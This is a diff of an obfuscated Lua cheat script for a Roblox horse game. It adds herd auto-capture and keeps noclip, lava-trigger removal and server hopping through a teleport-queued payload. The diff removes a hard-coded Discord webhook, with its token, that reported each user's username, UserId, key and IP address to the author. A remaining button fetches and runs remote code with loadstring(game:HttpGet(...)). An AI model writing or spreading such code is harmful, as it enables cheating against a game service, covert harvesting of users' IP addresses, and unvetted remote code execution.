@@ -5410,7 +5410,8 @@ local b={
 local c=false
 local d=false
 local e=false
-local f=0
+local f=false
+local g=0
 
 
 
@@ -5420,29 +5421,29 @@ local f=0
 
 
 
-local g=false
-local h="LowTier"
-local i=nil
+local h=false
+local i="LowTier"
+local j=nil
 
 
-local j={}
-local k=false
+local k={}
+local l=false
 
-local l=120
-local m=0.5
+local m=120
+local n=0.5
 
-local n=nil
 local o=nil
 local p=nil
 local q=nil
 local r=nil
 local s=nil
+local t=nil
 
-local function t(u,v)
-if not u then return end
-for w,x in ipairs(u:GetDescendants())do
-if x:IsA("BasePart")then
-x.CanCollide=not v
+local function u(v,w)
+if not v then return end
+for x,y in ipairs(v:GetDescendants())do
+if y:IsA("BasePart")then
+y.CanCollide=not w
 end
 end
 end
@@ -5451,247 +5452,286 @@ task.spawn(function()
 while true do
 ac.Heartbeat:Wait()
 if not al then continue end
-local u=ae.Character
-if not u then continue end
-local v=u:FindFirstChild("UpperTorso")
-local w=u:FindFirstChild("LowerTorso")
-if v and v.CanCollide then v.CanCollide=false end
+local v=ae.Character
+if not v then continue end
+local w=v:FindFirstChild("UpperTorso")
+local x=v:FindFirstChild("LowerTorso")
 if w and w.CanCollide then w.CanCollide=false end
+if x and x.CanCollide then x.CanCollide=false end
 end
 end)
 
-local function u()
-if p then p:Disconnect();p=nil end
+local function v()
+if q then q:Disconnect();q=nil end
+if p then p:Destroy();p=nil end
 if o then o:Destroy();o=nil end
-if n then n:Destroy();n=nil end
-if q then
-q.PlatformStand=false
-q=nil
-end
+if r then
+r.PlatformStand=false
 r=nil
+end
 s=nil
+t=nil
 end
 
-local function v(w,x)
-u()
+local function w(x,y)
+v()
 
-local y=ae.Character
-local z=y and y:FindFirstChild("HumanoidRootPart")
-if not z then return end
+local z=ae.Character
+local A=z and z:FindFirstChild("HumanoidRootPart")
+if not A then return end
 
-r=w:FindFirstAncestorOfClass("Model")
-s=x
+s=x:FindFirstAncestorOfClass("Model")
+t=y
 
-local A=y:FindFirstChildOfClass("Humanoid")
-if A then
-A.PlatformStand=true
-q=A
+local B=z:FindFirstChildOfClass("Humanoid")
+if B then
+B.PlatformStand=true
+r=B
 end
 
-t(y,true)
+u(z,true)
 
-n=Instance.new("Attachment")
-n.Parent=z
+o=Instance.new("Attachment")
+o.Parent=A
 
-o=Instance.new("LinearVelocity")
-o.Attachment0=n
-o.MaxForce=1e6
-o.RelativeTo=Enum.ActuatorRelativeTo.World
-o.VelocityConstraintMode=Enum.VelocityConstraintMode.Vector
-o.VectorVelocity=Vector3.zero
-o.Parent=z
+p=Instance.new("LinearVelocity")
+p.Attachment0=o
+p.MaxForce=1e6
+p.RelativeTo=Enum.ActuatorRelativeTo.World
+p.VelocityConstraintMode=Enum.VelocityConstraintMode.Vector
+p.VectorVelocity=Vector3.zero
+p.Parent=A
 
-p=ac.Heartbeat:Connect(function()
-if not w or not w.Parent then
-local B=s
-u()
-if B then B()end
+q=ac.Heartbeat:Connect(function()
+if not x or not x.Parent then
+local C=t
+v()
+if C then C()end
 return
 end
 
-local B=ae.Character and ae.Character:FindFirstChild("HumanoidRootPart")
-if not B or not o then return end
+local C=ae.Character and ae.Character:FindFirstChild("HumanoidRootPart")
+if not C or not p then return end
 
-local C=w.Position+Vector3.new(0,ai,0)
-local D=C-B.Position
-local E=D.Magnitude
+local D=x.Position+Vector3.new(0,ai,0)
+local E=D-C.Position
+local F=E.Magnitude
 
-if E<m then
-o.VectorVelocity=Vector3.zero
+if F<n then
+p.VectorVelocity=Vector3.zero
 return
 end
 
-o.VectorVelocity=D.Unit*math.min(E*60,l)
+p.VectorVelocity=E.Unit*math.min(F*60,m)
 end)
 end
 
-ae.CharacterAdded:Connect(function(w)
-u()
+ae.CharacterAdded:Connect(function(x)
+v()
 task.wait(1.5)
-t(w,false)
-e=false
-k=false
+u(x,false)
+f=false
+l=false
 if al then
-t(w,true)
+u(x,true)
 end
 end)
 
-local function w(x)
-if not x then return end
-local y=aq[x]or 1
-pcall(function()ah.Travel(x,y)end)
+local function x(y)
+if not y then return end
+local z=aq[y]or 1
+pcall(function()ah.Travel(y,z)end)
 end
 
-local function x()
-local y=workspace:FindFirstChild("Islands")
-if not y then return nil end
-for z,A in ipairs(y:GetChildren())do
-if A:FindFirstChild(ae.Name)then return A end
+local function y()
+local z=workspace:FindFirstChild("Islands")
+if not z then return nil end
+for A,B in ipairs(z:GetChildren())do
+if B:FindFirstChild(ae.Name)then return B end
 end
 return nil
 end
 
-local function y(z,A)
-if not A then return end
-if e then return end
+local function z(A,B)
+if not B then return end
+if f then return end
 
-local B=an[A.Name]
-if not B or#B==0 then return end
+local C=an[B.Name]
+if not C or#C==0 then return end
 
-local C=B[math.random(1,#B)].Position
-local D=ae.Character
-if not D then return end
-local E=D:FindFirstChildOfClass("Humanoid")
+local D=C[math.random(1,#C)].Position
+local E=ae.Character
+if not E then return end
+local F=E:FindFirstChildOfClass("Humanoid")
 
-e=true
-f=tick()
+f=true
+g=tick()
 
-local F=15
-local G=40
-local H=2
+local G=15
+local H=40
+local I=2
 
-local I=o~=nil
-local J,K=o,n
-local L,M=nil,nil
+local J=p~=nil
+local K,L=p,o
+local M,N=nil,nil
 
-if not I then
-if E then E.PlatformStand=true end
-M=Instance.new("Attachment")
-M.Parent=z
-L=Instance.new("LinearVelocity")
-L.Attachment0=M
-L.MaxForce=1e6
-L.RelativeTo=Enum.ActuatorRelativeTo.World
-L.VelocityConstraintMode=Enum.VelocityConstraintMode.Vector
-L.VectorVelocity=Vector3.zero
-L.Parent=z
-J,K=L,M
+if not J then
+if F then F.PlatformStand=true end
+N=Instance.new("Attachment")
+N.Parent=A
+M=Instance.new("LinearVelocity")
+M.Attachment0=N
+M.MaxForce=1e6
+M.RelativeTo=Enum.ActuatorRelativeTo.World
+M.VelocityConstraintMode=Enum.VelocityConstraintMode.Vector
+M.VectorVelocity=Vector3.zero
+M.Parent=A
+K,L=M,N
 end
 
-local function N()
-if L then L:Destroy()end
+local function O()
 if M then M:Destroy()end
-if E and not I then
-E.PlatformStand=false
+if N then N:Destroy()end
+if F and not J then
+F.PlatformStand=false
 end
-e=false
+f=false
 end
 
-local O
-O=ac.Heartbeat:Connect(function()
-if tick()-f>F then
-O:Disconnect()
-N()
+local P
+P=ac.Heartbeat:Connect(function()
+if tick()-g>G then
+P:Disconnect()
+O()
 return
 end
 
-local P=ae.Character
-local Q=P and P:FindFirstChild("HumanoidRootPart")
+local Q=ae.Character
+local R=Q and Q:FindFirstChild("HumanoidRootPart")
 
-if not Q or not J or not J.Parent then
-O:Disconnect()
-N()
+if not R or not K or not K.Parent then
+P:Disconnect()
+O()
 return
 end
 
-local R=C-Q.Position
-local S=R.Magnitude
+local S=D-R.Position
+local T=S.Magnitude
 
-if S<H then
-J.VectorVelocity=Vector3.zero
-O:Disconnect()
-N()
+if T<I then
+K.VectorVelocity=Vector3.zero
+P:Disconnect()
+O()
 else
-J.VectorVelocity=R.Unit*math.min(S*8,G)
+K.VectorVelocity=S.Unit*math.min(T*8,H)
 end
 end)
 end
 
-local function z(A,B)
-local C=nil
-local D=math.huge
+local function A(B,C)
+local D=nil
+local E=math.huge
 
-for E,F in B:GetDescendants()do
-if F:IsA("Model")
-and F:GetAttribute("behaviour")=="WanderingAnimal"
-and F:GetAttribute("origin")~="shop"
+for F,G in C:GetChildren()do
+if G:IsA("Model")
+and G:GetAttribute("behaviour")=="WanderingAnimal"
+and G:GetAttribute("origin")~="shop"
 then
+local H=G:FindFirstAncestor("Horse Sale Barn")
+if H then continue end
 
-local G=F:FindFirstAncestor("Horse Sale Barn")
-if G then continue end
-
-local H=F:FindFirstChild("HumanoidRootPart")
-if H then
-local I=(A.Position-H.Position).Magnitude
-if I<D then
+local I=G:FindFirstChild("HumanoidRootPart")
+if I then
+local J=(B.Position-I.Position).Magnitude
+if J<E then
+E=J
 D=I
-C=H
 end
 end
 end
 end
 
-return C
+return D
 end
 
-local function A(B)
-local C={}
-for D,E in ipairs(ap)do
-if b[E]then table.insert(C,E)end
-end
-if#C==0 then return nil end
-if#C==1 then return C[1]end
-for D,E in ipairs(C)do
-if E==B then return C[(D%#C)+1]end
-end
-return C[1]
-end
+local function B(C,D)
+if not e then return nil end
+
+local E=game:GetService("ReplicatedStorage")
+local F,G=pcall(function()
+return require(E.References).Utilities.RBXExtended
+end)
+if not F then return nil end
+
+local H=nil
+local I=math.huge
+
+for J,K in workspace:GetChildren()do
+
+if not K:IsA("Model")then continue end
+if not K.Name:match("^{[%x%-]+}$")then continue end
 
 
+local L,M=pcall(function()
+return G.GetTableAttribute(K,"data")
+end)
+if not L or not M then continue end
 
-local function B()
-local C=0
-for D,E in ipairs(ap)do
-if b[E]then C+=1 end
+
+if M.origin~="herd"then continue end
+if M.islandFnd~=D then continue end
+
+local N=K:FindFirstChild("HumanoidRootPart")
+if not N then continue end
+
+local O=(C.Position-N.Position).Magnitude
+if O<I then
+I=O
+H=N
 end
-return C
 end
 
-
-
-local function C()
-if i then return i end
-return ar[h]or ar["LowTier"]
+return H
 end
+
+local function C(D)
+local E={}
+for F,G in ipairs(ap)do
+if b[G]then table.insert(E,G)end
+end
+if#E==0 then return nil end
+if#E==1 then return E[1]end
+for F,G in ipairs(E)do
+if G==D then return E[(F%#E)+1]end
+end
+return E[1]
+end
+
 
 
 local function D()
-for E,F in ipairs(ap)do
-if b[F]and not j[F]then
+local E=0
+for F,G in ipairs(ap)do
+if b[G]then E+=1 end
+end
+return E
+end
+
+
+
+local function E()
+if j then return j end
+return ar[i]or ar["LowTier"]
+end
+
+
+local function F()
+for G,H in ipairs(ap)do
+if b[H]and not k[H]then
 return false
 end
 end
-return B()>0
+return D()>0
 end
 
 
@@ -5700,17 +5740,17 @@ end
 
 
 
-local function E(F,G)
-if k then return end
-k=true
+local function G(H,I)
+if l then return end
+l=true
 
 task.spawn(function()
-G()
+I()
 
-local H=C()
-print("going to",H)
+local J=E()
+print("going to",J)
 
-local I=string.format([[
+local K=string.format([[
     task.spawn(function()
         task.wait(3)
         local Players   = game:GetService("Players")
@@ -5795,216 +5835,226 @@ local I=string.format([[
         end
     end)
 ]],
-aq[H]or 1,
-H,
-H
+aq[J]or 1,
+J,
+J
 )
 
-queueonteleport(I)
+queueonteleport(K)
 print("queued tha script on foenem")
 
-w("Training Island")
+x("Training Island")
 
 task.wait(5)
-j={}
-k=false
-F[1]=false
+k={}
+l=false
+H[1]=false
 end)
 end
 
-local function F()
-local G=workspace:FindFirstChild("Islands")
-if not G then return end
-local H=G:FindFirstChild("Volcano Island")
-if not H then return end
-local I=H:FindFirstChild("LavaParts")
+local function H()
+local I=workspace:FindFirstChild("Islands")
 if not I then return end
-for J,K in ipairs(I:GetDescendants())do
-if K:IsA("TouchTransmitter")then K:Destroy()end
+local J=I:FindFirstChild("Volcano Island")
+if not J then return end
+local K=J:FindFirstChild("LavaParts")
+if not K then return end
+for L,M in ipairs(K:GetDescendants())do
+if M:IsA("TouchTransmitter")then M:Destroy()end
 end
 end
 
 do
-local G=nil
-ac.Heartbeat:Connect(function()
-local H=x()
-if H and H.Name=="Volcano Island"and G~="Volcano Island"then
-G="Volcano Island"
-F()
-elseif not H or H.Name~="Volcano Island"then
-G=H and H.Name or nil
-end
-end)
-task.spawn(function()
-while true do F();task.wait(3)end
-end)
-end
-
-do
-local G=5
-
-task.spawn(function()
-local H=0
 local I=nil
-local J=false
-local K=0
-local L=0
-local M=false
+ac.Heartbeat:Connect(function()
+local J=y()
+if J and J.Name=="Volcano Island"and I~="Volcano Island"then
+I="Volcano Island"
+H()
+elseif not J or J.Name~="Volcano Island"then
+I=J and J.Name or nil
+end
+end)
+task.spawn(function()
+while true do H();task.wait(3)end
+end)
+end
+
+do
+local I=5
+
+task.spawn(function()
+local J=0
+local K=nil
+local L=false
+local M=0
+local N=0
+local O=false
 
 
-local N={false}
+local P={false}
 
-local function O(P)
-if not P then return false end
-if not P.Parent then return false end
-local Q=P:FindFirstAncestorOfClass("Model")
-if not Q then return false end
-if not Q.Parent then return false end
+local function Q(R)
+if not R then return false end
+if not R.Parent then return false end
+local S=R:FindFirstAncestorOfClass("Model")
+if not S then return false end
+if not S.Parent then return false end
 return true
 end
 
-local function P()
-u()
-I=nil
-L=0
+local function R()
+v()
+K=nil
+N=0
 end
 
-local function Q(R)
-if not R then return end
-if J then return end
-J=true
-H=0
-K=0
-P()
+local function S(T)
+if not T then return end
+if L then return end
+L=true
+J=0
+M=0
+R()
 
-local S=tick()
-while e do
-if tick()-S>20 then
-e=false
+local U=tick()
+while f do
+if tick()-U>20 then
+f=false
 break
 end
 task.wait(0.2)
 end
 task.wait(0.5)
 
-w(R)
-local T=tick()+30
+x(T)
+local V=tick()+30
 repeat
 task.wait(1)
-local U=x()
-if U and U.Name==R then break end
-until tick()>T
+local W=y()
+if W and W.Name==T then break end
+until tick()>V
 task.wait(2)
-J=false
+L=false
 end
 
-local function R(S)
-if J then return end
-local T=x()
-if not T then return end
-y(S,T)
+local function T(U)
+if L then return end
+local V=y()
+if not V then return end
+z(U,V)
 end
 
 while true do
 task.wait(0.4)
 
 
-if N[1]then J=true end
+if P[1]then L=true end
 
-if e and tick()-f>20 then
-e=false
+if f and tick()-g>20 then
+f=false
 end
 
-if al~=M then
-M=al
-local S=ae.Character
-if S then t(S,al)end
+if al~=O then
+O=al
+local U=ae.Character
+if U then u(U,al)end
 if not al then
-P()
-H=0
-K=0
-j={}
-k=false
+R()
+J=0
+M=0
+k={}
+l=false
 end
 end
 
 if not al then continue end
-if J or k then continue end
+if L or l then continue end
 
-local S=ae.Character
-local T=S and S:FindFirstChild("HumanoidRootPart")
-if not T then continue end
+local U=ae.Character
+local V=U and U:FindFirstChild("HumanoidRootPart")
+if not V then continue end
 
-local U=x()
-if not U then continue end
+local W=y()
+if not W then continue end
 
-if c and not b[U.Name]then
-local V=A(U.Name)
-if V then Q(V)end
+if c and not b[W.Name]then
+local X=C(W.Name)
+if X then S(X)end
 continue
 end
 
-if I then
-if O(I)then
-L=0
+if K then
+if Q(K)then
+N=0
 else
-L+=1
-if L>=G then P()end
+N+=1
+if N>=I then R()end
 end
 end
 
-if not I then
-local V=z(T,U)
-if V then
-I=V
-L=0
+if not K then
+local X=nil
 
-j[U.Name]=nil
-v(I,function()
-I=nil
-L=0
+
+if e then
+X=B(V,W.Name)
+end
+
+
+if not X then
+X=A(V,W)
+end
+
+if X then
+K=X
+N=0
+k[W.Name]=nil
+w(K,function()
+K=nil
+N=0
 end)
 end
 end
 
-if I then
-H=0
-K=0
+if K then
+J=0
+M=0
 else
-H+=1
-K+=0.4
+J+=1
+M+=0.4
 
-if c and K>=ak then
+if c and M>=ak then
 
-if g then
-j[U.Name]=true
+if h then
+k[W.Name]=true
 end
 
-local V=A(U.Name)
+local X=C(W.Name)
 
 
-if g and D()then
-J=true
-N[1]=true
-K=0
-H=0
-E(N,P)
+if h and F()then
+L=true
+P[1]=true
+M=0
+J=0
+G(P,R)
 continue
 end
 
-if V and V~=U.Name then
-Q(V)
+if X and X~=W.Name then
+S(X)
 else
-R(T)
-K=0
-H=0
+T(V)
+M=0
+J=0
 end
 continue
 end
 
-if H>=(tonumber(am)or aj)then
-R(T)
-H=0
+if J>=(tonumber(am)or aj)then
+T(V)
+J=0
 end
 end
 end
@@ -6012,32 +6062,33 @@ end)
 end
 
 return{
-setEnabled=function(G)al=G end,
-setWildherd=function(G)d=G end,
+setEnabled=function(I)al=I end,
+setWildherd=function(I)d=I end,
+setHerdCapture=function(I)e=I end,
 getIslands=function()
-local G={}
-for H,I in pairs(b)do G[H]=I end
-return G
+local I={}
+for J,K in pairs(b)do I[J]=K end
+return I
 end,
-setAutotravel=function(G)c=G end,
-setIsland=function(G,H)b[G]=H end,
-setIdleLimit=function(G)am=G end,
+setAutotravel=function(I)c=I end,
+setIsland=function(I,J)b[I]=J end,
+setIdleLimit=function(I)am=I end,
 
 
-setServerHop=function(G)
-g=G
-j={}
-k=false
+setServerHop=function(I)
+h=I
+k={}
+l=false
 end,
-setIslandChoice=function(G)
+setIslandChoice=function(I)
 
 
-if ar[G]then
-h=G
-i=nil
+if ar[I]then
+i=I
+j=nil
 else
 
-i=G
+j=I
 end
 end,
 getIslandTiers=function()return ar end,
@@ -8957,10 +9008,7 @@ Misc=f:AddTab("Misc"),
 
 local j=i.HomePageLowkey:AddLeftGroupbox("Dev Notes")
 
-j:AddLabel('[+] Added autumn to overlay')
-j:AddLabel('[+] Added autumn buy key and redeem')
-
-j:AddLabel('[+] Minor UI update')
+j:AddLabel('[+] Fixed capture herds')
 
 
 local k=i.HomePageLowkey:AddRightGroupbox("Session Information")
@@ -9069,6 +9117,16 @@ Tooltip='Captures the horse',
 
 Callback=function(t)
 ah.setEnabled(t)
+end
+})
+
+q:AddToggle('HerdCapture',{
+Text='Capture Herds',
+Default=false,
+Tooltip='Enables autotravel',
+
+Callback=function(t)
+ae.setHerdCapture(t)
 end
 })
 
@@ -10218,49 +10276,50 @@ ab.Unloaded=true
 end)
 
 
-local function aP()
-LRM_SEND_WEBHOOK(
-"https://ptb.discord.com/api/webhooks/1518306503952437358/KzPOKd0oWJGLr5Skdyp46UiWv7y9x0_XUs21kWMjYmYyN4FP9LczAfigwL8IoYLy2NPu",
-{
-username="fantasyhaxx",
-embeds={
-{
-title="User executed!",
-description="🔑 **User details:** \n**Discord ID:** <@%DISCORD_ID%>\n**Key:** ||`%USER_KEY%`||\n**Note:** `%USER_NOTE%`",
-color=0xFFFFFF,
-fields={
-{
-name="Account details:",
-value="**Username:** `"..
-LRM_SANITIZE(game:GetService("Players").LocalPlayer.Name,"[a-zA-Z0-9_]{2,60}")..
-"`\n**User ID:** `"..
-LRM_SANITIZE(game:GetService("Players").LocalPlayer.UserId,"[0-9]{2,35}")..
-"`",
-inline=false
-},
-{
-name="IP:",
-value="%CLIENT_IP% :flag_%COUNTRY_CODE%:",
-inline=true
-}
-}
-}
-}
-}
-)
-end
-
-aP()
-
-
-local aQ=i["UI Settings"]:AddLeftGroupbox("Menu")
 
 
 
 
-aQ:AddLabel("Menu bind"):AddKeyPicker("MenuKeybind",{Default="RightShift",NoUI=true,Text="Menu keybind"})
-aQ:AddButton("Unload",function()ab:Unload()end)
-aQ:AddButton("Switch UI",function()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local aP=i["UI Settings"]:AddLeftGroupbox("Menu")
+
+
+
+
+aP:AddLabel("Menu bind"):AddKeyPicker("MenuKeybind",{Default="RightShift",NoUI=true,Text="Menu keybind"})
+aP:AddButton("Unload",function()ab:Unload()end)
+aP:AddButton("Switch UI",function()
 ab:Unload()
 task.wait(2)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/bananasxyz/satanas/refs/heads/main/olduimandem.lua"))()
